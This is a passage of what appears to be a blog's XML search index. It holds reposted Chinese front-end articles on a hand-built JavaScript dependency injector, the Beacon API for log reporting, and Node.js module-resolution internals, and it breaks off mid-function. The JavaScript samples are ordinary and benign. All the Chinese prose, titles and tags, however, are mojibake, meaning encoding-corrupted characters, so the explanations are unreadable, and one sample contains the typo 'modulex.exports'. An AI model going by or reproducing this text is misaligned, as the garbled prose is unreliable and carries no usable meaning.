é€šè¿‡æ­¤æ–¹æ³•è¿”å›çš„å­—ç¬¦ä¸²ç»™æˆ‘ä»¬éå†å‚æ•°çš„èƒ½åŠ›ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œèƒ½å¤Ÿè·å–ä»–ä»¬çš„åå­—ã€‚è¿™å…¶å®æ˜¯Angular å®ç°å®ƒçš„ä¾èµ–æ³¨å…¥çš„æ–¹æ³•ã€‚æˆ‘å·äº†ä¸€ç‚¹æ‡’ï¼Œç›´æ¥æˆªå–Angularä»£ç ä¸­è·å–å‚æ•°çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ 1/^function\s*[^\(]*\(\s*([^\)]*)\)/m æˆ‘ä»¬å¯ä»¥åƒä¸‹é¢è¿™æ ·ä¿®æ”¹resolve çš„ä»£ç ï¼š 1234567891011121314resolve: function() &#123; var func, deps, scope, args = [], self = this; func = arguments[0]; deps = func.toString().match(/^function\s*[^\(]*\(\s*([^\)]*)\)/m)[1].replace(/ /g, &apos;&apos;).split(&apos;,&apos;); scope = arguments[1] || &#123;&#125;; return function() &#123; var a = Array.prototype.slice.call(arguments, 0); for(var i=0; i&lt;deps.length; i++) &#123; var d = deps[i]; args.push(self.dependencies[d] &amp;&amp; d != &apos;&apos; ? self.dependencies[d] : a.shift()); &#125; func.apply(scope || &#123;&#125;, args); &#125; &#125; æˆ‘ä»¬æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„ç»“æœå¦‚ä¸‹ï¼š 12345[&quot;function (service, router, other)&quot;, &quot;service, router, other&quot;] çœ‹èµ·æ¥ï¼Œæˆ‘ä»¬åªéœ€è¦ç¬¬äºŒé¡¹ã€‚ä¸€æ—¦æˆ‘ä»¬æ¸…æ¥šç©ºæ ¼å¹¶åˆ†å‰²å­—ç¬¦ä¸²å°±å¾—åˆ°`deps`æ•°ç»„ã€‚åªæœ‰ä¸€ä¸ªå¤§çš„æ”¹å˜ï¼švar a = Array.prototype.slice.call(arguments, 0);...args.push(self.dependencies[d] &amp;&amp; d != &apos;&apos; ? self.dependencies[d] : a.shift()); æˆ‘ä»¬å¾ªç¯éå†dependenciesæ•°ç»„ï¼Œå¦‚æœå‘ç°ç¼ºå¤±é¡¹åˆ™å°è¯•ä»argumentså¯¹è±¡ä¸­è·å–ã€‚è°¢å¤©è°¢åœ°ï¼Œå½“æ•°ç»„ä¸ºç©ºæ—¶ï¼Œshiftæ–¹æ³•åªæ˜¯è¿”å›undefinedï¼Œè€Œä¸æ˜¯æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼ˆè¿™å¾—ç›Šäºwebçš„æ€æƒ³ï¼‰ã€‚æ–°ç‰ˆçš„injector èƒ½åƒä¸‹é¢è¿™æ ·ä½¿ç”¨ï¼š 123456var doSomething = injector.resolve(function(service, other, router) &#123; expect(service().name).to.be(&apos;Service&apos;); expect(router().name).to.be(&apos;Router&apos;); expect(other).to.be(&apos;Other&apos;);&#125;);doSomething(&quot;Other&quot;); ä¸å¿…é‡å†™ä¾èµ–å¹¶ä¸”ä»–ä»¬çš„é¡ºåºå¯ä»¥æ‰“ä¹±ã€‚å®ƒä»ç„¶æœ‰æ•ˆï¼Œæˆ‘ä»¬æˆåŠŸå¤åˆ¶äº†Angularçš„é­”æ³•ã€‚ ç„¶è€Œï¼Œè¿™ç§åšæ³•å¹¶ä¸å®Œç¾ï¼Œè¿™å°±æ˜¯åå°„ç±»å‹æ³¨å°„ä¸€ä¸ªéå¸¸å¤§çš„é—®é¢˜ã€‚å‹ç¼©ä¼šç ´åæˆ‘ä»¬çš„é€»è¾‘ï¼Œå› ä¸ºå®ƒæ”¹å˜å‚æ•°çš„åå­—ï¼Œæˆ‘ä»¬å°†æ— æ³•ä¿æŒæ­£ç¡®çš„æ˜ å°„å…³ç³»ã€‚ä¾‹å¦‚ï¼ŒdoSometing()å‹ç¼©åå¯èƒ½çœ‹èµ·æ¥åƒè¿™æ ·ï¼š 1var doSomething=function(e,t,n)&#123;var r=e();var i=t()&#125; Angularå›¢é˜Ÿæå‡ºçš„è§£å†³æ–¹æ¡ˆçœ‹èµ·æ¥åƒï¼š 123var doSomething = injector.resolve([&apos;service&apos;, &apos;router&apos;, function(service, router) &#123;&#125;]); è¿™çœ‹èµ·æ¥å¾ˆåƒæˆ‘ä»¬å¼€å§‹æ—¶çš„è§£å†³æ–¹æ¡ˆã€‚æˆ‘æ²¡èƒ½æ‰¾åˆ°ä¸€ä¸ªæ›´å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œæ‰€ä»¥å†³å®šç»“åˆè¿™ä¸¤ç§æ–¹æ³•ã€‚ä¸‹é¢æ˜¯injectorçš„æœ€ç»ˆç‰ˆæœ¬ã€‚ 1234567891011121314151617181920212223242526var injector = &#123; dependencies: &#123;&#125;, register: function(key, value) &#123; this.dependencies[key] = value; &#125;, resolve: function() &#123; var func, deps, scope, args = [], self = this; if(typeof arguments[0] === &apos;string&apos;) &#123; func = arguments[1]; deps = arguments[0].replace(/ /g, &apos;&apos;).split(&apos;,&apos;); scope = arguments[2] || &#123;&#125;; &#125; else &#123; func = arguments[0]; deps = func.toString().match(/^function\s*[^\(]*\(\s*([^\)]*)\)/m)[1].replace(/ /g, &apos;&apos;).split(&apos;,&apos;); scope = arguments[1] || &#123;&#125;; &#125; return function() &#123; var a = Array.prototype.slice.call(arguments, 0); for(var i=0; i&lt;deps.length; i++) &#123; var d = deps[i]; args.push(self.dependencies[d] &amp;&amp; d != &apos;&apos; ? self.dependencies[d] : a.shift()); &#125; func.apply(scope || &#123;&#125;, args); &#125; &#125;&#125; resolveè®¿å®¢æ¥å—ä¸¤æˆ–ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªå‚æ•°å®ƒå®é™…ä¸Šå’Œæ–‡ç« å‰é¢å†™çš„ä¸€æ ·ã€‚ç„¶è€Œï¼Œå¦‚æœæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå®ƒä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°è½¬æ¢å¹¶å¡«å……depsæ•°ç»„ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæµ‹è¯•ä¾‹å­ï¼š 123456var doSomething = injector.resolve(&apos;router,,service&apos;, function(a, b, c) &#123; expect(a().name).to.be(&apos;Router&apos;); expect(b).to.be(&apos;Other&apos;); expect(c().name).to.be(&apos;Service&apos;);&#125;);doSomething(&quot;Other&quot;); ä½ å¯èƒ½æ³¨æ„åˆ°åœ¨ç¬¬ä¸€ä¸ªå‚æ•°åé¢æœ‰ä¸¤ä¸ªé€—å·â€”â€”æ³¨æ„è¿™ä¸æ˜¯ç¬”è¯¯ã€‚ç©ºå€¼å®é™…ä¸Šä»£è¡¨â€œOtherâ€å‚æ•°ï¼ˆå ä½ç¬¦ï¼‰ã€‚è¿™æ˜¾ç¤ºäº†æˆ‘ä»¬æ˜¯å¦‚ä½•æ§åˆ¶å‚æ•°é¡ºåºçš„ã€‚ ç›´æ¥æ³¨å…¥Scopeæœ‰æ—¶æˆ‘ä¼šç”¨åˆ°ç¬¬ä¸‰ä¸ªæ³¨å…¥å˜é‡ï¼Œå®ƒæ¶‰åŠåˆ°æ“ä½œå‡½æ•°çš„ä½œç”¨åŸŸï¼ˆæ¢å¥è¯è¯´ï¼Œå°±æ˜¯thiså¯¹è±¡ï¼‰ã€‚æ‰€ä»¥ï¼Œå¾ˆå¤šæ—¶å€™ä¸éœ€è¦ä½¿ç”¨è¿™ä¸ªå˜é‡ã€‚ 1234567891011121314151617181920var injector = &#123; dependencies: &#123;&#125;, register: function(key, value) &#123; this.dependencies[key] = value; &#125;, resolve: function(deps, func, scope) &#123; var args = []; scope = scope || &#123;&#125;; for(var i=0; i&lt;deps.length, d=deps[i]; i++) &#123; if(this.dependencies[d]) &#123; scope[d] = this.dependencies[d]; &#125; else &#123; throw new Error(&apos;Can\&apos;t resolve &apos; + d); &#125; &#125; return function() &#123; func.apply(scope || &#123;&#125;, Array.prototype.slice.call(arguments, 0)); &#125; &#125;&#125; æˆ‘ä»¬æ‰€åšçš„ä¸€åˆ‡å…¶å®å°±æ˜¯å°†ä¾èµ–æ·»åŠ åˆ°ä½œç”¨åŸŸã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¼€å‘äººå‘˜ä¸ç”¨å†å†™ä¾èµ–æ€§å‚æ•°ï¼›å®ƒä»¬å·²ç»æ˜¯å‡½æ•°ä½œç”¨åŸŸçš„ä¸€éƒ¨åˆ†ã€‚ 123456var doSomething = injector.resolve([&apos;service&apos;, &apos;router&apos;], function(other) &#123; expect(this.service().name).to.be(&apos;Service&apos;); expect(this.router().name).to.be(&apos;Router&apos;); expect(other).to.be(&apos;Other&apos;);&#125;);doSomething(&quot;Other&quot;);]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯æ—¥å¿—ä¸ŠæŠ¥çš„æ–°å§¿åŠ¿â€œBeaconâ€]]></title>
    <url>%2F2020%2F02%2F11%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E6%97%A5%E5%BF%97%E4%B8%8A%E6%8A%A5%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%E2%80%9CBeacon%E2%80%9D%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªçŸ¥ä¹ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/48171879 åœ¨å‰ç«¯åº”ç”¨è¶Šæ¥å¤æ‚çš„ä»Šå¤©ï¼Œä¸ºäº†ç›‘æ§å‰ç«¯åº”ç”¨æ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œé€šå¸¸ä¼šåœ¨å‰ç«¯æ”¶é›†ä¸€äº›é”™è¯¯ä¸æ€§èƒ½ç­‰æ•°æ®ï¼Œæœ€ç»ˆæˆ‘ä»¬ä¼šå°†è¿™äº›æ•°æ®ä¸ŠæŠ¥åˆ°æœåŠ¡ç«¯ã€‚ ä¸ŠæŠ¥çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œç†è®ºä¸Šæˆ‘ä»¬åªè¦èƒ½æŠŠæ•°æ®å‘ç»™æœåŠ¡ç«¯å°±è¡Œäº†ã€‚åœ¨æµè§ˆå™¨ä¸­å¯ä»¥å‘é€è¯·æ±‚çš„æ–¹å¼éå¸¸å¤šï¼ŒåŒ…æ‹¬ä¸é™äºï¼šxhrã€fetchã€scriptæ ‡ç­¾ã€imgæ ‡ç­¾ã€linkæ ‡ç­¾ã€CSSèƒŒæ™¯å›¾ç­‰ã€‚ ä¸åŒçš„ä¸ŠæŠ¥æ–¹å¼ä¹‹é—´å­˜åœ¨å¾ˆå¤§çš„å·®å¼‚ã€‚ç›®å‰ä¸»æµçš„ä¸ŠæŠ¥æ–¹å¼æ˜¯åˆ©ç”¨imgæ ‡ç­¾çš„srcå±æ€§å‘é€è¯·æ±‚ï¼Œä¾‹å¦‚ï¼š 1(new Image).src = `/haopv.gif?a=xx&amp;b=xxx` å› ä¸ºæ—¥å¿—ä¸ŠæŠ¥ä¸éœ€è¦å“åº”å¤„ç†ï¼Œåªéœ€è¦æŠŠæ•°æ®å‘è¿‡å»å°±è¡Œã€‚å¹¶ä¸”å¤§éƒ¨åˆ†æ¥æ”¶æ—¥å¿—çš„æœåŠ¡å™¨åœ°å€ä¸ä¸šåŠ¡æ–¹å¯èƒ½ä¸æ˜¯ä¸€ä¸ªéƒ¨é—¨ï¼Œç”šè‡³å¯èƒ½ä¸æ˜¯ä¸€ä¸ªå…¬å¸ï¼Œæ‰€ä»¥ä¼šæ¶‰åŠåˆ°è·¨åŸŸé—®é¢˜ã€‚ä½¿ç”¨imgæ ‡ç­¾çš„srcå±æ€§æ—¢å¯ä»¥æŠŠæ•°æ®å‘é€ç»™æœåŠ¡ç«¯åˆä¸éœ€è¦æ¥æ”¶å“åº”ï¼ŒåŒæ—¶è§£å†³äº†è·¨åŸŸé—®é¢˜ï¼Œæ‰€ä»¥æ˜¯ç›®å‰æ¯”è¾ƒå—æ¬¢è¿çš„æ—¥å¿—ä¸ŠæŠ¥å®ç°æ–¹å¼ã€‚ ä½†æ˜¯è¿™æ ·å°±çœŸçš„æ²¡é—®é¢˜äº†ä¹ˆï¼Ÿ æ—¥å¿—ä¸ŠæŠ¥å¹¶ä¸æ˜¯åº”ç”¨çš„ä¸»è¦åŠŸèƒ½é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ—¥å¿—ä¸ŠæŠ¥æ˜¯ä½ä¼˜å…ˆçº§çš„ï¼Œå®ƒä¸åº”è¯¥ä¸å…¶ä»–é«˜ä¼˜å…ˆçº§æ“ä½œï¼ˆä¾‹å¦‚ï¼šè·å–å…³é”®èµ„æºã€è¾“å…¥å“åº”ã€è¿è¡ŒåŠ¨ç”»ç­‰ï¼‰å»ç«äº‰ç½‘ç»œä¸è®¡ç®—èµ„æºï¼ˆé€šä¿—çš„è¯´å°±æ˜¯æ—¥å¿—ä¸ŠæŠ¥è¡Œä¸ºä¸åº”è¯¥å½±å“ä¸šåŠ¡é€»è¾‘ï¼Œä¸åº”è¯¥å ç”¨ä¸šåŠ¡è®¡ç®—èµ„æºï¼‰ã€‚ä½†æ˜¯è¿™ç§å•å‘è¯·æ±‚åˆè´Ÿè´£ä¼ é€’åº”ç”¨çš„é”™è¯¯ä¸æ€§èƒ½æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦ç¡®ä¿å®ƒä¼šè¢«äº¤ä»˜åˆ°æœåŠ¡ç«¯ã€‚ é€šå¸¸ï¼Œä¸ºäº†æé«˜äº¤ä»˜ç‡ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©ç«‹å³äº¤ä»˜æ¯ä¸ªæ”¶é›†åˆ°çš„æ•°æ®ï¼Œè€Œä¸æ˜¯åˆå¹¶ä¸æ¨è¿Ÿäº¤ä»˜ã€‚å»¶è¿Ÿä¼ é€’å¯èƒ½æ„å‘³ç€è¯·æ±‚æ²¡æœ‰è¶³å¤Ÿçš„æ—¶é—´æ¥æˆåŠŸå®Œæˆï¼Œè¿™å¯èƒ½å¯¼è‡´é‡è¦çš„åº”ç”¨æ•°æ®ä¸¢å¤±ã€‚ è¿™å°±æ„å‘³ç€æˆ‘ä»¬çš„äº¤ä»˜è¡Œä¸ºæœ‰å¯èƒ½ä¼šè¢«æ’å…¥åˆ°æ­£åœ¨å¿™ç¢Œå·¥ä½œçš„äº‹ä»¶å¾ªç¯ä¸­ï¼Œä»è€ŒæŠ¢å äº†å…¶ä»–é«˜ä¼˜å…ˆçº§çš„ä»»åŠ¡çš„èµ„æºï¼Œå› ä¸ºJSæ˜¯å•çº¿ç¨‹çš„ã€‚è¿™æœ‰å¯èƒ½ä¼šæŸå®³ç”¨æˆ·ä½“éªŒã€‚ æˆ‘ä»¬å¦‚ä½•ç¡®ä¿æ—¥å¿—æ•°æ®ä¼šè¢«äº¤ä»˜çš„åŒæ—¶ï¼Œå°½å¯èƒ½åœ°å‡å°‘ä¸å…¶ä»–å…³é”®æ“ä½œçš„èµ„æºäº‰ç”¨å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¿¡æ ‡ï¼ˆBeaconï¼‰ã€‚ ä¿¡æ ‡ï¼ˆBeaconï¼‰ä¿¡æ ‡ï¼ˆBeaconï¼‰å¯ä»¥å¼‚æ­¥ä¸éé˜»å¡çš„æ•°æ®ä¼ è¾“ï¼Œä»è€Œæœ€å¤§é™åº¦åœ°å‡å°‘ä¸å…¶ä»–å…³é”®æ“ä½œçš„èµ„æºäº‰ç”¨ï¼ŒåŒæ—¶å®ƒå¯ä»¥ç¡®ä¿è¿™äº›è¯·æ±‚ä¸€å®šä¼šè¢«å¤„ç†å¹¶å°†å…¶ä¼ é€’åˆ°æœåŠ¡ç«¯ï¼š ä¿¡æ ‡è¯·æ±‚ä¼˜å…ˆé¿å…ä¸å…³é”®æ“ä½œå’Œæ›´é«˜ä¼˜å…ˆçº§çš„ç½‘ç»œè¯·æ±‚ç«äº‰ã€‚ ä¿¡æ ‡è¯·æ±‚å¯ä»¥æœ‰æ•ˆåœ°åˆå¹¶ï¼Œä»¥ä¼˜åŒ–ç§»åŠ¨è®¾å¤‡ä¸Šçš„èƒ½é‡ä½¿ç”¨ã€‚ ä¿è¯é¡µé¢å¸è½½ä¹‹å‰å¯åŠ¨ä¿¡æ ‡è¯·æ±‚ï¼Œå¹¶å…è®¸è¿è¡Œå®Œæˆä¸”ä¸ä¼šé˜»å¡è¯·æ±‚æˆ–é˜»å¡å¤„ç†ç”¨æˆ·äº¤äº’äº‹ä»¶çš„ä»»åŠ¡ã€‚ ä¿¡æ ‡çš„ä½¿ç”¨éå¸¸ç®€å•ï¼š 1234var data = JSON.stringify(&#123; name: &apos;Berwin&apos;&#125;);navigator.sendBeacon(&apos;/haopv&apos;, data) å‚æ•° urlï¼šä¸ŠæŠ¥çš„ç›®æ ‡åœ°å€ dataï¼šè¢«ä¸ŠæŠ¥çš„æ•°æ® è¿”å›å€¼ï¼ˆReturn Valueï¼‰ï¼šsendBeaconæ–¹æ³•è¢«æ‰§è¡Œåè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œtrueä»£è¡¨ç”¨æˆ·ä»£ç†æˆåŠŸåœ°å°†ä¿¡æ ‡è¯·æ±‚åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­ï¼Œå¦åˆ™è¿”å›falseã€‚ ç”¨æˆ·ä»£ç†å¯¹é€šè¿‡ä¿¡æ ‡å‘é€çš„æ•°æ®é‡è¿›è¡Œé™åˆ¶ï¼Œä»¥ç¡®ä¿è¯·æ±‚è¢«æˆåŠŸä¼ é€’åˆ°æœåŠ¡ç«¯ï¼Œå¹¶ä¸”å¯¹æµè§ˆå™¨æ´»åŠ¨çš„å½±å“é™åˆ°æœ€å°ã€‚å¦‚æœè¦æ’é˜Ÿçš„æ•°æ®é‡è¶…å‡ºäº†ç”¨æˆ·ä»£ç†çš„é™åˆ¶ï¼ŒsendBeaconæ–¹æ³•å°†è¿”å›falseï¼Œè¿”å›trueä»£è¡¨æµè§ˆå™¨å·²å°†æ•°æ®æ’é˜Ÿç­‰å¾…ä¼ é€’ã€‚ç„¶è€Œï¼Œç”±äºå®é™…æ•°æ®ä¼ è¾“æ˜¯å¼‚æ­¥çš„ï¼Œæ‰€ä»¥æ­¤æ–¹æ³•ä¸æä¾›ä»»ä½•å…³äºæ•°æ®ä¼ è¾“æ˜¯å¦æˆåŠŸçš„ä¿¡æ¯ã€‚ è™½ç„¶ä¿¡æ ‡å¾—åˆ°äº†å¾ˆé«˜çš„æ”¯æŒåº¦ï¼Œä½†è¿˜æ˜¯æ— æ³•åœ¨æ‰€æœ‰æµè§ˆå™¨ä¸­ä½¿ç”¨ï¼Œæ‰€ä»¥å¦‚æœæ‚¨æƒ³ä½¿ç”¨ä¿¡æ ‡ä¸ŠæŠ¥å‰ç«¯æ—¥å¿—ï¼Œä¸€äº›ç‰¹å¾æ£€æµ‹æ˜¯å¿…è¦çš„ã€‚ è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé€šè¿‡ä¿¡æ ‡å‘é€çš„è¯·æ±‚ï¼Œè¯·æ±‚æ–¹æ³•å‡ä¸ºPOSTï¼Œä¸”ä¸æ”¯æŒä¿®æ”¹ã€‚ æ€»ç»“æ—¥å¿—ä¸ŠæŠ¥åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ä¸ä»…ä»…æ˜¯æŠŠè¯·æ±‚å‘å‡ºå»ã€‚æ—¥å¿—ä¸ŠæŠ¥å¹¶ä¸æ˜¯ä¸»è¦é€»è¾‘æ‰€ä»¥ä¼˜å…ˆçº§å¾ˆä½ï¼Œä¸ºäº†æœ€ä½³çš„ç”¨æˆ·ä½“éªŒï¼Œåœ¨è€ƒè™‘é¿å…å ç”¨ä¸šåŠ¡è®¡ç®—èµ„æºå’Œé¿å…ç«äº‰ä¸šåŠ¡ç½‘ç»œè¯·æ±‚çš„åŒæ—¶æˆ‘ä»¬è¿˜è¦ä¿è¯æ•°æ®ä¸€å®šä¼šäº¤ä»˜åˆ°æœåŠ¡ç«¯ï¼Œæœ€å¥½çš„æ–¹å¼æ˜¯å°½å¯èƒ½çš„ä½¿ç”¨ä¿¡æ ‡ï¼ˆBeaconï¼‰ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node æ¨¡å—åŠ è½½æœºåˆ¶]]></title>
    <url>%2F2020%2F02%2F05%2FNode.js%2Fnode%20%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5d84456851882556f33d5fb0 å…ˆæ‰§è¡Œä¸€æ®µä»£ç a/index.js 1modulex.exports = 1; useA.js 1234const a = require(&apos;./a&apos;);const express = require(&apos;express&apos;);console.log(module);console.log(global.require); æ‰§è¡ŒuseA.js 12345678910111213141516171819202122Module &#123; id: &apos;.&apos;, exports: &#123;&#125;, parent: null, filename: &apos;/Users/mac/Desktop/share/demo1/useA.js&apos;, loaded: false, children: [ Module &#123; id: &apos;/Users/mac/Desktop/demo/a.js&apos;, exports: &apos;1&apos;, parent: [Circular], filename: &apos;/Users/mac/Desktop/demo/a.js&apos;, loaded: true, children: [], paths: [Array] &#125; ], paths: [ &apos;/Users/zhangxk/Desktop/demo/node_modules&apos;, &apos;/Users/zhangxk/Desktop/node_modules&apos;, &apos;/Users/zhangxk/node_modules&apos;, &apos;/Users/node_modules&apos;, &apos;/node_modules&apos; ] &#125;undefined é€šè¿‡ä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥æƒ³åˆ°å‡ ä¸ªé—®é¢˜ useA.jsæ˜¯å¦‚ä½•æ‰¾åˆ°a/index.jså’Œexpressçš„ a.jsçš„module.exportsåœ¨useA.jsä¸­æ˜¯å¦‚ä½•è·å–åˆ°çš„ console.log(global.require); è¾“å‡ºçš„æ˜¯undefinedï¼Œè¯´æ˜requireä¸æŒ‚è½½åœ¨å…¨å±€å¯¹è±¡ä¸Šï¼Œé‚£ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨ æ¨¡å—ä¸­å¹¶æ²¡æœ‰ç”³æ˜moduleå˜é‡ï¼Œä¸ºä»€ä¹ˆå¯ä»¥è¾“å‡ºä¸€ä¸ªå¯¹è±¡ æœ¬ç¯‡æ–‡ç« å°±é€šè¿‡è¿™å››ä¸ªé—®é¢˜ï¼Œæ¥é€æ¸è§£ænodeæ¨¡å—åŒ–æœºåˆ¶ æ¨¡å—æŸ¥æ‰¾è§„åˆ™ é¦–å…ˆæˆ‘çœ‹ä¸€ä¸‹require()å‡½æ•°åœ¨nodeå†…éƒ¨æ˜¯å¦‚ä½•å®šä¹‰çš„ 12345678function require(path) &#123; try &#123; exports.requireDepth += 1; return mod.require(path); &#125; finally &#123; exports.requireDepth -= 1; &#125;&#125; mod.require 1234Module.prototype.require = function(id) &#123; // ... return Module._load(id, this, /* isMain */ false);&#125;; Module._loadå‡½æ•° 12345678910111213141516171819202122232425262728293031Module._load = function(request, parent, isMain) &#123; //è·å–æ–‡ä»¶è·¯å¾„ var filename = Module._resolveFilename(request, parent, isMain); // å°è¯•ä»ç¼“å­˜ä¸­è¯»å–æ¨¡å— var cachedModule = Module._cache[filename]; if (cachedModule) &#123; updateChildren(parent, cachedModule, true); return cachedModule.exports; &#125; // å¦‚æœæ˜¯åŸç”Ÿæ¨¡å—è¿”å› if (NativeModule.nonInternalExists(filename)) &#123; debug(&apos;load native module %s&apos;, request); return NativeModule.require(filename); &#125; // ç¬¬ä¸‰æ–¹æ¨¡å—åˆ›å»ºæ¨¡å—å¯¹è±¡ var module = new Module(filename, parent); if (isMain) &#123; process.mainModule = module; module.id = &apos;.&apos;; &#125; // ç¼“å­˜æ¨¡å— Module._cache[filename] = module; // åŠ è½½æ¨¡å— tryModuleLoad(module, filename); // è¿”å›æ¨¡å—çš„exports return module.exports;&#125;; Module._resolveFilename å¦‚ä½•æŸ¥æ‰¾åˆ°æ–‡ä»¶è·¯å¾„çš„ 123456789101112131415161718Module._resolveFilename = function(request, parent, isMain, options) &#123;// å¦‚æœæ˜¯nodeåŸç”Ÿæ¨¡å—ï¼Œç›´æ¥è¿”å›æ¨¡å—åç§° if (NativeModule.nonInternalExists(request)) &#123; return request; &#125; var paths; if (typeof options === &apos;object&apos; &amp;&amp; options !== null &amp;&amp; // ... &#125; else &#123; // è·å–æ¨¡å—å¯èƒ½å‡ºç°çš„ä½ç½® paths = Module._resolveLookupPaths(request, parent, true); &#125; // ç²¾ç¡®æŸ¥æ‰¾æ¨¡å—ä½ç½® var filename = Module._findPath(request, paths, isMain); return filename;&#125;; Module._resolveLookupPathsç²—ç•¥æŸ¥æ‰¾æ–‡ä»¶å¯èƒ½å‡ºç°çš„èŒƒå›´ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Module._resolveLookupPaths = function(request, parent, newReturn) &#123; // åˆ¤æ–­æ˜¯ä¸æ˜¯ä»¥./æˆ–è€…../å¼•å…¥çš„æ¨¡å— if (request.length &lt; 2 || request.charCodeAt(0) !== CHAR_DOT || (request.charCodeAt(1) !== CHAR_DOT &amp;&amp; request.charCodeAt(1) !== CHAR_FORWARD_SLASH)) &#123;// å°†æœ¬æœºNODE_PATHå…¨å±€è·¯å¾„ã€ç”¨æˆ·æ ¹ç›®å½•ä¸‹çš„.node_moduleså’Œ.node_librariesç»„æˆçš„æ•°ç»„èµ‹å€¼ç»™paths var paths = modulePaths; if (parent) &#123; if (!parent.paths) paths = parent.paths = []; else // å°†çˆ¶çº§pathså±æ€§ paths = parent.paths.concat(paths); &#125; const base = path.basename(parent.filename); var parentIdPath; if (base.length &gt; indexLen) &#123; var i = 0; for (; i &lt; indexLen; ++i) &#123; if (indexChars[i] !== base.charCodeAt(i)) break; &#125; if (i === indexLen) &#123; // We matched &apos;index.&apos;, let&apos;s validate the rest for (; i &lt; base.length; ++i) &#123; const code = base.charCodeAt(i); if (code !== CHAR_UNDERSCORE &amp;&amp; (code &lt; CHAR_0 || code &gt; CHAR_9) &amp;&amp; (code &lt; CHAR_UPPERCASE_A || code &gt; CHAR_UPPERCASE_Z) &amp;&amp; (code &lt; CHAR_LOWERCASE_A || code &gt; CHAR_LOWERCASE_Z)) break; &#125; if (i === base.length) &#123; // Is an index module parentIdPath = parent.id; &#125; else &#123; // Not an index module parentIdPath = path.dirname(parent.id); &#125; &#125; else &#123; // Not an index module parentIdPath = path.dirname(parent.id); &#125; &#125; else &#123; // Not an index module parentIdPath = path.dirname(parent.id); &#125; var id = path.resolve(parentIdPath, request); // make sure require(&apos;./path&apos;) and require(&apos;path&apos;) get distinct ids, even // when called from the toplevel js file if (parentIdPath === &apos;.&apos; &amp;&amp; id.indexOf(&apos;/&apos;) === -1) &#123; id = &apos;./&apos; + id; &#125; var parentDir = [path.dirname(parent.filename)]; return (newReturn ? parentDir : [id, parentDir]);&#125;; ç²¾ç¡®æŸ¥æ‰¾æ–‡ä»¶è·¯å¾„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374Module._findPath = function(request, paths, isMain) &#123; if (path.isAbsolute(request)) &#123; paths = [&apos;&apos;]; &#125; else if (!paths || paths.length === 0) &#123; return false; &#125; var cacheKey = request + &apos;\x00&apos; + (paths.length === 1 ? paths[0] : paths.join(&apos;\x00&apos;)); // å°è¯•ä»ç¼“å­˜è·¯å¾„ä¸­è·å–è·¯å¾„ var entry = Module._pathCache[cacheKey]; if (entry) return entry; var exts; var trailingSlash = request.length &gt; 0 &amp;&amp; request.charCodeAt(request.length - 1) === CHAR_FORWARD_SLASH; if (!trailingSlash) &#123; trailingSlash = /(?:^|\/)\.?\.$/.test(request); &#125; // For each path for (var i = 0; i &lt; paths.length; i++) &#123; // Don&apos;t search further if path doesn&apos;t exist const curPath = paths[i]; if (curPath &amp;&amp; stat(curPath) &lt; 1) continue; var basePath = path.resolve(curPath, request); var filename; // è°ƒç”¨internalModuleStatæ–¹æ³•æ¥åˆ¤æ–­æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œæ–‡ä»¶å­˜åœ¨è¿”å›0ï¼Œæ–‡ä»¶å¤¹å­˜åœ¨è¿”å›1ï¼Œæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ä¸å­˜åœ¨è¿”å›-2 var rc = stat(basePath); if (!trailingSlash) &#123; if (rc === 0) &#123; // File. if (!isMain) &#123; if (preserveSymlinks) &#123; filename = path.resolve(basePath); &#125; else &#123; filename = toRealPath(basePath); &#125; &#125; else if (preserveSymlinksMain) &#123; filename = path.resolve(basePath); &#125; else &#123; filename = toRealPath(basePath); &#125; &#125; if (!filename) &#123; // try it with each of the extensions if (exts === undefined) exts = Object.keys(Module._extensions); // ä¸€æ¬¡å°è¯•åŠ è½½.js .json .nodeç»“å°¾çš„æ–‡ä»¶ filename = tryExtensions(basePath, exts, isMain); &#125; &#125; // if (!filename &amp;&amp; rc === 1) &#123; // Directory. // try it with each of the extensions at &quot;index&quot; if (exts === undefined) exts = 